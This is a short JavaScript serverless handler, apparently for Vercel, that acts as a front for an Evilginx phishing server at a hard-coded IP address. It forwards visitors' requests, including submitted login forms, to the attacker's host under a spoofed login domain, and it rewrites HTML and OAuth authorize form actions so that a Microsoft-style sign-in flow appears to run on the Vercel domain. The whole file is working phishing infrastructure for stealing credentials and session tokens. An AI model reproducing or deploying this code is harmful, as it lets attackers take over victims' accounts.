import https from 'https';
import { Transform } from 'stream';

export default async function handler(req, res) {
  const targetHost = '185.165.171.174'; // Your Evilginx server IP
  const targetPath = req.url;

  // Critical headers
  const headers = {
    'Host': 'login.espeharete.top',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'X-Forwarded-For': req.headers['x-forwarded-for'] || req.ip || '127.0.0.1',
    'X-Real-IP': req.headers['x-real-ip'] || req.ip || '127.0.0.1',
    'Referer': `https://aa-iido.vercel.app${req.url}`
  };

  const options = {
    hostname: targetHost,
    port: 443,
    path: targetPath,
    method: req.method,
    headers: headers,
    rejectUnauthorized: false,
    timeout: 15000
  };

  return new Promise((resolve) => {
    const proxyReq = https.request(options, (proxyRes) => {
      // Filter response headers
      const responseHeaders = { ...proxyRes.headers };
      
      // Remove headers that might cause redirects
      delete responseHeaders['location'];
      delete responseHeaders['content-length'];
      delete responseHeaders['transfer-encoding'];
      
      // Check if HTML content
      const isHtml = responseHeaders['content-type']?.includes('text/html');
      
      res.writeHead(proxyRes.statusCode, responseHeaders);
      
      if (isHtml) {
        // Create a transform stream to rewrite URLs
        const transformer = new Transform({
          transform(chunk, encoding, callback) {
            let data = chunk.toString();
            
            // Rewrite ALL Evilginx URLs to Vercel domain
            data = data.replace(
              /https:\/\/login\.espeharete\.top(\/[^"']*)/g,
              'https://aa-iido.vercel.app$1'
            );
            
            // Special handling for OAuth redirects
            data = data.replace(
              /action="https:\/\/login\.espeharete\.top\/common\/oauth2\/v2\.0\/authorize/g,
              'action="https://aa-iido.vercel.app/common/oauth2/v2.0/authorize'
            );
            
            this.push(data);
            callback();
          }
        });
        
        proxyRes.pipe(transformer).pipe(res);
      } else {
        // Non-HTML content just gets piped through
        proxyRes.pipe(res);
      }
      
      proxyRes.on('end', () => resolve());
    });

    proxyReq.on('error', (err) => {
      console.error('Proxy error:', err);
      if (!res.headersSent) {
        res.status(502).send('Bad Gateway');
      }
      resolve();
    });

    proxyReq.on('timeout', () => {
      proxyReq.destroy();
      if (!res.headersSent) {
        res.status(504).send('Gateway Timeout');
      }
      resolve();
    });

    // Forward request body if present
    if (req.method === 'POST' || req.method === 'PUT') {
      req.pipe(proxyReq);
    } else {
      proxyReq.end();
    }
  });
}
